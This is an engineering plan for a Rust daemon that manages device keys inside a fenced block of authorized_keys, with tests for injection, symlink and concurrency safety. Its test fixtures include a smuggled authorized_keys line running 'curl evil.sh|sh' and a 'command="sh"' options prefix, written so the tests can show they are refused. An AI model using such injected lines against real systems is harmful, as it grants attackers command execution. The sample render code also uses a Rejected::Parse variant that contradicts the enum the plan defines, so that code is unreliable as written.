# Runner-Side Enrollment Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give the daemon the ability to add and remove a device's key in its own `~/.ssh/authorized_keys`, safely enough that a botched write cannot lock anyone out of their own runner, and to report honestly which keys are enrolled.

**Architecture:** A new `fence` module in `crates/daemon` owns every read and write of `authorized_keys`. Nothing else in the tree touches that file. Three protocol methods sit on top of it — `client.list`, `client.enroll`, `client.revoke` — at `host_admin`, and revocation closes the revoked client's live sessions before it answers.

**Tech Stack:** Rust, `ssh-key` 0.7.0-rc.11 (already present via russh), `rustix` or `nix` for descriptor-relative file operations, protobuf over the existing transport.

**Spec:** [`docs/superpowers/specs/2026-08-16-device-onboarding-design.md`](../specs/2026-08-16-device-onboarding-design.md) — "Enrolling the key", "Rendering the key", "The list of devices, and of runners".

**Depends on:** [`2026-08-16-onboarding-prerequisites.md`](2026-08-16-onboarding-prerequisites.md) and [`2026-08-16-runner-rename.md`](2026-08-16-runner-rename.md).

## Global Constraints

- **US English throughout.** **Never run `cargo fmt`.** **`cargo` is at `~/.cargo/bin/cargo`.**
- **`~/.ssh/authorized_keys` is user-critical.** Losing SSH access to your own runner because of a Far Cooler action is a release-blocking failure with its own tests — `docs/farcooler-design.md:1017`.
- **Far Cooler edits only inside its own fence markers**, atomically, with a checksummed backup, and refuses to edit a file whose fence it cannot verify.
- **Portable file operations.** `openat2` is Linux-only and this ships on macOS. Use descriptor-relative `openat` with `O_NOFOLLOW` and `fstat` verification.
- **Enrolled entries are restricted:** `restrict,command="farcoolerd --stdio --client <id> --scope <scope>"`. That command must match what the prerequisites plan taught the daemon to parse.
- **No new dependency without saying so.** `rustix` is a decision; make it in Task 2's commit message.

---

### Task 1: The fence, read-only

Before anything writes, something must read — and refuse to proceed on a file it does not understand.

**Files:**
- Create: `crates/daemon/src/fence.rs`
- Modify: `crates/daemon/src/lib.rs` — add `mod fence;`
- Test: inline `mod tests` in `fence.rs`

**Interfaces:**
- Produces:
  - `pub struct Entry { pub fingerprint: String, pub client_id: String, pub scope: Scope, pub label: String, pub account: Option<String>, pub line: String }`
  - `pub enum FenceError { Missing, Damaged(String), Io(std::io::Error) }`
  - `pub fn parse(contents: &str) -> Result<Vec<Entry>, FenceError>`
  - `pub const BEGIN: &str = "# BEGIN FAR COOLER — do not edit inside this block";`
  - `pub const END: &str = "# END FAR COOLER";`
  - Tasks 2–5 consume all of these.

- [ ] **Step 1: Write the failing tests**

```rust
#[cfg(test)]
mod tests {
    use super::*;

    const ONE: &str = concat!(
        "ssh-rsa AAAAsomeone-elses-key nothing-to-do-with-us\n",
        "# BEGIN FAR COOLER — do not edit inside this block\n",
        "restrict,command=\"farcoolerd --stdio --client abc123 --scope control\" ",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0000000000000000000000000000000000000000 ",
        "farcooler-iPhone-t7xq9vd8\n",
        "# END FAR COOLER\n",
    );

    /// Only what is inside the fence is ours.
    #[test]
    fn entries_outside_the_fence_are_not_read_as_ours() {
        let entries = parse(ONE).expect("parse");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].client_id, "abc123");
        assert_eq!(entries[0].scope, Scope::Control);
        assert_eq!(entries[0].label, "farcooler-iPhone-t7xq9vd8");
    }

    /// A file with no fence has no entries, and that is not an error.
    #[test]
    fn a_file_with_no_fence_is_empty_rather_than_damaged() {
        let entries = parse("ssh-rsa AAAAonly-theirs me@laptop\n").expect("parse");
        assert!(entries.is_empty());
    }

    /// A fence that opens and never closes is damage, and damage refuses.
    ///
    /// The alternative is guessing where the block ends, and a wrong guess
    /// rewrites lines Far Cooler did not write. Refusing loses a feature;
    /// guessing loses someone's access to their own runner.
    #[test]
    fn an_unterminated_fence_refuses_rather_than_guesses() {
        let text = format!("{BEGIN}\nrestrict,command=\"x\" ssh-ed25519 AAAA k\n");
        match parse(&text) {
            Err(FenceError::Damaged(_)) => {}
            other => panic!("an unterminated fence was accepted: {other:?}"),
        }
    }

    /// Two fences is damage too.
    #[test]
    fn a_second_fence_refuses() {
        let text = format!("{BEGIN}\n{END}\n{BEGIN}\n{END}\n");
        assert!(matches!(parse(&text), Err(FenceError::Damaged(_))));
    }

    /// A line inside the fence that is not ours is reported, not dropped.
    ///
    /// Dropping it would mean the next write deleted a key someone added by
    /// hand inside our block. It is listed as foreign so a person can see it.
    #[test]
    fn a_foreign_line_inside_the_fence_is_kept_and_reported() {
        let text = format!("{BEGIN}\nssh-ed25519 AAAAhand-added someone\n{END}\n");
        let entries = parse(&text).expect("parse");
        assert_eq!(entries.len(), 1);
        assert!(entries[0].client_id.is_empty(), "a foreign line claimed a client id");
    }
}
```

- [ ] **Step 2: Run to verify failure**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon fence::
```

Expected: FAIL to compile.

- [ ] **Step 3: Implement `parse`**

Parse only between `BEGIN` and `END`. For each line: split the options field from the key, read `--client` and `--scope` out of the `command=`, parse the key with `ssh_key::PublicKey::from_openssh` to get the fingerprint, and keep the raw line verbatim for round-tripping. A line that does not parse becomes an `Entry` with an empty `client_id` and its raw text — foreign, kept, reported.

- [ ] **Step 4: Run**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon fence::
```

- [ ] **Step 5: Commit**

```bash
git add crates/daemon/src/fence.rs crates/daemon/src/lib.rs
git commit -m "feat(daemon): read the fence, and refuse to guess at a damaged one

An unterminated or duplicated fence refuses rather than guessing where
the block ends. A wrong guess rewrites lines Far Cooler did not write,
and losing SSH access to your own runner because of a Far Cooler action
is a release-blocking failure. Refusing loses a feature."
```

---

### Task 2: Rendering a key, safely

**Files:**
- Modify: `crates/daemon/src/fence.rs`

**Interfaces:**
- Produces: `pub fn render(received: &str, label: &str, client_id: &str, scope: Scope) -> Result<String, Rejected>` and `pub enum Rejected { MultiLine, Algorithm, Unparseable }`.

**No `String` payload**, from review. `Rejected` crosses the protocol and the
FFI to a screen, and this app already renders error strings from this layer in
Settings. A parser message built from attacker-supplied bytes must not be one of
them, and plan 5's constraints forbid it. The parser's own message goes to the
daemon log; the wire carries a code and the app owns the sentence.

- [ ] **Step 1: Write the failing tests**

```rust
    /// One value in must never be two lines out.
    ///
    /// authorized_keys is line-oriented and every line may carry options
    /// BEFORE the key, so appending a received string can append a second
    /// entry granting a stranger a key that runs a command on every
    /// connection. Nothing about the write is malformed and it succeeds.
    #[test]
    fn a_second_line_smuggled_into_a_key_is_refused() {
        let hostile = concat!(
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0000000000000000000000000000000000000000 ok\n",
            "command=\"curl evil.sh|sh\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH1111111111111111111111111111111111111111 them",
        );
        assert!(matches!(render(hostile, "phone", "c1", Scope::Control), Err(Rejected::MultiLine)));
    }

    /// A leading options field is not a key.
    #[test]
    fn an_options_field_in_the_received_key_is_refused() {
        let hostile = "command=\"sh\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0000000000000000000000000000000000000000 x";
        assert!(render(hostile, "phone", "c1", Scope::Control).is_err());
    }

    /// Ed25519 only, so nothing arrives that this has not reasoned about.
    #[test]
    fn a_non_ed25519_key_is_refused() {
        let rsa = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0000 x";
        assert!(matches!(render(rsa, "phone", "c1", Scope::Control), Err(Rejected::Algorithm)));
    }

    /// The comment is ours, not theirs.
    ///
    /// from_openssh KEEPS the comment it parsed, so trailing text is a valid
    /// comment rather than a parse error. Rebuilding from key_data is what
    /// actually regenerates it.
    #[test]
    fn the_comment_is_regenerated_from_the_label_we_chose() {
        let key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0000000000000000000000000000000000000000 whatever they/typed";
        let line = render(key, "iPhone 17", "c1", Scope::Control).expect("render");
        assert!(line.contains("farcooler-iPhone-17-"), "label not ours: {line}");
        assert!(!line.contains("they/typed"), "their comment survived: {line}");
        assert!(!line.contains('\n'), "a newline reached the line: {line}");
    }

    /// A restricted entry, every time, at every scope.
    #[test]
    fn every_entry_is_restricted_and_forced() {
        let key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0000000000000000000000000000000000000000 x";
        let line = render(key, "iPhone", "c1", Scope::Read).expect("render");
        assert!(line.starts_with("restrict,command=\""), "not restricted: {line}");
        assert!(line.contains("--client c1"), "no client id: {line}");
        assert!(line.contains("--scope read"), "no scope: {line}");
    }

    /// A rendered line parses back to the key we were given.
    #[test]
    fn a_rendered_line_round_trips() {
        let key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0000000000000000000000000000000000000000 x";
        let line = render(key, "iPhone", "c1", Scope::Control).expect("render");
        let text = format!("{BEGIN}\n{line}\n{END}\n");
        let entries = parse(&text).expect("parse");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].client_id, "c1");
    }
```

- [ ] **Step 2: Run to verify failure**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon fence::
```

- [ ] **Step 3: Implement**

```rust
/// Never write bytes that came off the wire.
///
/// `to_openssh()` already returns `algorithm base64 comment`, so prefixing the
/// algorithm emits `ssh-ed25519 ssh-ed25519 AAAA…` and enrolls nothing. And
/// `from_openssh` KEEPS the comment it parsed, so "trailing garbage fails to
/// parse" is false — trailing text is a valid comment. Rebuilding from
/// `key_data` is the only thing that actually regenerates it.
pub fn render(
    received: &str,
    label: &str,
    client_id: &str,
    scope: Scope,
) -> Result<String, Rejected> {
    if received.contains(['\r', '\n']) {
        return Err(Rejected::MultiLine);
    }
    let parsed = ssh_key::PublicKey::from_openssh(received)
        .map_err(|e| Rejected::Parse(e.to_string()))?;
    if !matches!(parsed.algorithm(), ssh_key::Algorithm::Ed25519) {
        return Err(Rejected::Algorithm);
    }
    let fingerprint = parsed.fingerprint(ssh_key::HashAlg::Sha256).to_string();
    let key = ssh_key::PublicKey::new(parsed.key_data().clone(), comment_for(label, &fingerprint));
    let body = key.to_openssh().map_err(|e| Rejected::Parse(e.to_string()))?;
    let scope_name = match scope {
        Scope::Read => "read",
        Scope::Control => "control",
        _ => "host_admin",
    };
    let line = format!(
        "restrict,command=\"farcoolerd --stdio --client {client_id} --scope {scope_name}\" {body}"
    );
    debug_assert!(!line.contains(['\r', '\n']));
    Ok(line)
}

/// The key is the identity; the comment is a label for humans.
///
/// A filtered name is not an identity — two devices filter to the same string,
/// and renaming a phone must not collide with another. The fingerprint suffix
/// is what makes the comment unique; the name is what makes it readable.
fn comment_for(label: &str, fingerprint: &str) -> String {
    let safe: String =
        label.chars().map(|c| if c.is_ascii_alphanumeric() || c == '_' { c } else { '-' }).collect();
    let safe = safe.trim_matches('-');
    let safe = if safe.is_empty() { "device" } else { safe };
    let short: String = fingerprint.trim_start_matches("SHA256:").chars().take(8).collect();
    format!("farcooler-{safe}-{short}")
}
```

- [ ] **Step 4: Run, then commit**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon fence::
git add crates/daemon/src/fence.rs
git commit -m "feat(daemon): render a key from its key data, never from its bytes

One value in must never be two lines out. authorized_keys is
line-oriented and every line may carry options before the key, so
appending a received string can append a second entry granting a
stranger a key that runs a command on every connection -- and nothing
about that write is malformed.

Two bugs from the design's first draft are fixed here rather than
inherited: to_openssh already includes the algorithm, and from_openssh
keeps the comment it parsed, so 'trailing garbage fails to parse' was
false. Rebuilding from key_data is what regenerates the comment."
```

---

### Task 3: Writing the fence, atomically

**Files:**
- Modify: `crates/daemon/src/fence.rs`
- Modify: `crates/daemon/Cargo.toml` — add `rustix` with the `fs` feature
- Test: `crates/daemon/tests/the_fence_cannot_lose_your_access.rs`

**Interfaces:**
- Produces: `pub fn write(path: &Path, markers: Markers, entries: &[String], foreign: &[String]) -> Result<(), FenceError>`, replacing the fence's contents and leaving every byte outside it identical.

**Generic over its path and markers, from review.** Plan 5 originally specified
this same algorithm a second time in Swift for `~/.ssh/config`, with its own
parallel tests. One implementation, one test suite: this writer takes the file
and the fence markers, the daemon uses it for `authorized_keys`, and the Mac app
reaches it through the FFI for `~/.ssh/config` — the pattern the repo already
uses for `farcooler_client_generate_key`. A bug in a routine whose failure mode
is losing SSH access should exist in one place, not two.

- [ ] **Step 1: Write the failing tests**

Create `crates/daemon/tests/the_fence_cannot_lose_your_access.rs`. Cover, each as its own named test:

- `every_byte_outside_the_fence_survives` — a file with entries before and after, a write, a byte-for-byte comparison of everything outside.
- `a_file_with_no_trailing_newline_still_gets_a_separate_entry` — the classic append bug, which this write path avoids by rewriting rather than appending; assert the result parses to the expected count.
- `a_symlinked_ssh_directory_refuses` — `~/.ssh` is a symlink to another directory; the write refuses and touches neither.
- `a_damaged_fence_refuses_and_changes_nothing` — an unterminated fence; assert the file's bytes are unchanged after the attempt.
- `a_backup_is_left_beside_the_file` — assert the backup exists and matches the pre-write contents.
- `two_concurrent_writes_do_not_interleave` — spawn two writes with different entries; assert the result parses cleanly and contains one of the two complete sets.

- [ ] **Step 2: Run to verify failure**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon --test the_fence_cannot_lose_your_access
```

- [ ] **Step 3: Implement**

Open `~` by descriptor, then `.ssh` relative to it with `O_NOFOLLOW | O_DIRECTORY`, `fstat` to confirm ownership and mode, then the file relative to that descriptor. Take an advisory lock on a sibling lock file. Read, rebuild, write to a temp file in the same directory, `fsync` the file, `rename` relative to the held directory descriptor, `fsync` the directory.

`O_NOFOLLOW` on the final path alone guards only that component — an attacker who replaces `.ssh` with a symlink between the check and the rename redirects the write. Anchoring every component to a held descriptor is what closes it. Say so in a comment.

- [ ] **Step 4: Run, build, commit**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon
git add crates/daemon/src/fence.rs crates/daemon/Cargo.toml Cargo.toml crates/daemon/tests/
git commit -m "feat(daemon): write the fence atomically, anchored to descriptors

Adds rustix, which is a decision rather than an implementation detail:
O_NOFOLLOW on the final path guards only that component, so an attacker
who replaces .ssh with a symlink between the check and the rename
redirects the write. Anchoring every component to a held descriptor is
what closes it, and openat2 would be neater but is Linux-only."
```

---

### Task 4: `client.list`, `client.enroll`, `client.revoke`

**Files:**
- Modify: `proto/farcooler.proto` — three requests, two results
- Modify: `crates/daemon/src/rpc.rs` — `required_scope` and `dispatch`
- Modify: `crates/daemon/src/wire.rs`
- Test: `crates/daemon/tests/rpc_over_socket.rs`

**Interfaces:**
- Produces:
  - `client.list` → `ClientList { repeated EnrolledClient items }` at `Scope::Read`
  - `client.enroll` → `EnrolledClient` at `Scope::HostAdmin`
  - `client.revoke` → `Operation` at `Scope::HostAdmin`
  - `message EnrolledClient { string client_id; string fingerprint; string label; Scope scope; string account; int64 enrolled_at; bool foreign; }`
  - `host.get` gains `runner_id`, carrying **the existing `stable_host_id(install_id)`** — defined at `crates/daemon/src/service.rs:1934` as `pub(crate) fn stable_host_id(install_id: &str) -> Uuid`, called at `service.rs:378` and `runtime.rs:43`. Exposing it on the wire means widening it to `pub`; it is a name, not a secret, and it is already visible as the tmux socket name and in worktree owner markers. Do not invent a second identifier: `install-id` is already persistent, already lives in the runtime directory (`config.rs:10`), and is already per-`FARCOOLER_HOME`, so three engineers on one box have three. That is exactly the property the spec argued for when it ruled out the SSH host key, which all three would share. `RunnerEntry.id` in the ceremony plan consumes this and had no producer before review.

- [ ] **Step 1: Add the messages to `proto/farcooler.proto`**

Append new field numbers; never reuse or renumber. Add the new variants to `Result`'s `oneof` with fresh tags.

- [ ] **Step 2: Write the failing tests in `rpc_over_socket.rs`**

- `a_read_client_cannot_enroll` — assert `Forbidden`.
- `enrolling_twice_reports_already_present_rather_than_failing` — an existing Key B is usually exactly this.
- `client_list_reports_a_foreign_line_as_foreign` — a hand-added line inside the fence.
- `enrolling_a_plain_line_is_refused` — the request carries no way to ask for one; assert the API has no such field rather than that a flag is rejected.

- [ ] **Step 3: Run to verify failure, implement, run again**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon --test rpc_over_socket
```

- [ ] **Step 4: Commit**

```bash
git add proto/ crates/daemon/
git commit -m "feat(daemon): enroll, revoke and list the keys in this runner's fence

client.enroll writes restricted lines only. That is a guard rail against
a mistake, not a security boundary: a control device drives a terminal
and a terminal appends to authorized_keys, which the design says out
loud rather than claiming an enforcement it does not have."
```

---

### Task 5: Revocation closes live sessions

Removing a key stops future authentication and does nothing to a session already open — and `ControlPersist=120` keeps a multiplexed master answering for two minutes after that. Revocation that returns before those are closed is a revocation that did not happen.

**Files:**
- Modify: `crates/daemon/src/rpc.rs` — `client.revoke`
- Modify: `crates/daemon/src/service.rs` or wherever connections are tracked — index live sessions by client id
- Test: `crates/daemon/tests/revocation_closes_what_it_revoked.rs`

**Interfaces:**
- Consumes: the prerequisites plan's `--client` parsing, which is what makes a session attributable at all.
- Produces: `client.revoke` answers only after the revoked client's sessions are closed.

- [ ] **Step 1: Write the failing test**

```rust
/// Revocation is containment, so it has to have happened when it answers.
///
/// sshd reads authorized_keys at authentication and never again, so a session
/// already open survives the line being deleted -- and a multiplexed master
/// keeps opening new channels on it for ControlPersist seconds.
#[tokio::test]
async fn a_revoked_client_loses_its_open_session_before_revoke_answers() {
    // Two sessions: one to revoke, one that must be untouched.
    // Assert the revoked one's next call fails and the bystander's succeeds.
}
```

- [ ] **Step 2: Implement**

Track live sessions by the `--client` id in the handshake. On revoke: rewrite the fence, then close every connection carrying that id, then answer. Order matters — answering first would report a containment that had not happened.

- [ ] **Step 3: Run, then commit**

```bash
~/.cargo/bin/cargo test -p farcooler-daemon
git add crates/daemon/
git commit -m "feat(daemon): revocation closes what it revoked, before it answers

sshd reads authorized_keys at authentication and never again, so
deleting a line leaves an open session running -- and a multiplexed
master keeps opening channels on it for ControlPersist seconds after.
Answering before those are closed reports a containment that has not
happened."
```

## Self-Review

**Spec coverage.** Implements "Enrolling the key" (Tasks 3, 4), "Rendering the key" (Task 2), the fence half of "The list of devices, and of runners" (Tasks 1, 4), and the revocation promise in "Grants are per runner" (Task 5). The audit entry the spec asks for is part of Task 4's `EnrolledClient` (`enrolled_at`, `account`); the "removal lists what a device enrolled" flow is app-side and belongs to the next plan.

**Placeholders.** Task 5's test body is a comment rather than code, deliberately: how sessions are tracked is a fact about `service.rs` that this plan has not read, and inventing an API there would be worse than naming the shape and letting the implementer read it. Every other test is complete.

**Type consistency.** `Entry`, `FenceError`, `Rejected`, `parse`, `render`, `write`, `BEGIN`, `END` are defined in Tasks 1–3 and used in Task 4. `EnrolledClient`'s fields match what `parse` produces.
